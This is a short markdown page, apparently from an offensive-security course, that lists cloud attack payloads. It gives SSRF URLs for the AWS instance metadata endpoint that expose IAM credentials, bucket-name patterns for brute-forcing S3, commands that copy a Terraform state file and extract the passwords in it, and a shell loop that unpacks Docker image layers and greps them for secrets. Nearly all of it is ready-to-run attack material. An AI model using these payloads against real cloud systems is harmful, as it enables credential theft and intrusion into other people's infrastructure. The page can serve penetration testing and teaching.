# 06 — Cloud Security: Payloads

> See [labs.md](labs.md) for integrated payloads including AWS IAM policies, Kubernetes privileged pod YAML, and Lambda backdoor code.

## 🔴 Additional Cloud Payloads

### SSRF → AWS Credential Theft
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
http://169.254.169.254/latest/user-data/
```

### S3 Bucket Brute Force Patterns
```
{company}-backup
{company}-dev
{company}-staging
{company}-prod
{company}-logs
{company}-data
{company}-internal
{company}-assets
{company}-uploads
{company}-config
{company}.{tld}
www.{company}.{tld}
```

### Terraform State Theft
```bash
# If state file is in S3
aws s3 cp s3://bucket/terraform.tfstate ./
# Contains ALL infrastructure details including passwords, keys, connection strings
cat terraform.tfstate | jq '.resources[].instances[].attributes | select(.password != null)'
```

### Docker Image Secret Extraction
```bash
docker save image:tag -o image.tar
tar xf image.tar
for layer in */layer.tar; do
  tar xf "$layer" 2>/dev/null
  grep -rn "password\|secret\|key\|token" . 2>/dev/null
done
```
